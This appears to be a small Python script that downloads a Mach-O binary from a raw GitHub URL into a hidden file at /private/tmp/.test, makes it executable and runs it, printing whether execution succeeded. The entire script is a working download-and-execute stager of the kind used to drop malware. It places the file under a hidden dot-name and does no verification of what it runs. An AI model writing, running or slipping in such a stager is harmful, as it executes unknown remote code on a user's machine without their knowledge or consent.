import os
import subprocess
import urllib.request

# URL of the binary in your GitHub repo (replace with actual URL)
binary_url = "https://raw.githubusercontent.com/S-MaN14th/test/refs/heads/main/test-macho"

# Destination path
destination_path = "/private/tmp/.test"

# Ensure the directory exists
os.makedirs(os.path.dirname(destination_path), exist_ok=True)

# Download the binary
urllib.request.urlretrieve(binary_url, destination_path)

# Make it executable
os.chmod(destination_path, 0o755)


# Execute the binary and capture the result
result = subprocess.run([destination_path], capture_output=True)

# Check execution status
if result.returncode == 0:
    print("Binary executed successfully.")
else:
    print(f"Execution failed with return code {result.returncode}. Error: {result.stderr.decode()}")